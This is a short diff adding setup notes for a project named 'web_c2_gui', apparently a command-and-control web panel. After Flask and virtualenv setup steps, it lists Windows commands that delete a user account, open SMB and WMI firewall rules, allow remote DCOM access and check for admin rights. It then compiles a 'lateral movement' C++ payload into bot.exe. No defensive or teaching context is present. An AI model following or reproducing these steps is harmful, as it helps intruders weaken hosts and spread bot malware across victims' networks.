@@ -1,0 +1,58 @@
+web_c2_gui/
+├── app.py              # Main Flask application
+├── requirements.txt    # Python dependencies
+├── setupr.py           # test setup file
+├── static/
+│   ├── css
+|   |   └──style.css  # CSS styles
+│   ├── index.html     # HTML template
+│   └── js
+|        └──app.js     # JavaScript functionality
+│       
+
+
+# to avoid version conflicts, Security and Isolation of Dependencies
+# thus install and activate virtual environment
+python -m venv venv
+venv\Scripts\Activate
+
+# install the dependencies
+python -m pip install -r requirements.txt
+
+# open the server
+python app.py
+
+
+
+# .... later at end
+deactivate
+
+
+#delete a user 
+net user <username> /delete
+
+powershell
+
+# Enable remote SCM (already enabled by default, but check firewall)
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
+
+# Enable remote WMI
+netsh advfirewall firewall set rule group="Windows Management Instrumentation (WMI)" new enable=Yes
+
+# Enable remote DCOM (already enabled, but allow remote activation)
+dcomcnfg.exe
+# → Component Services → Computers → My Computer → Properties → COM Security
+#   Edit Limits → Remote Access → Allow
+
+# check if powershell is running as admin or not
+[bool]([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# compile the lateral movement cpp
+g++ -O2 -std=c++11 payload/with_LM.cpp -o bot.exe -lws2_32 -liphlpapi -lmpr -ladvapi32 -lshell32 -luser32 -static
+
+
+
+g++ -O2 -std=c++11 leverup_bot_fixed.cpp -o bot.exe -lws2_32 -liphlpapi -lmpr -ladvapi32 -lshell32 -luser32 -static
+
+
+
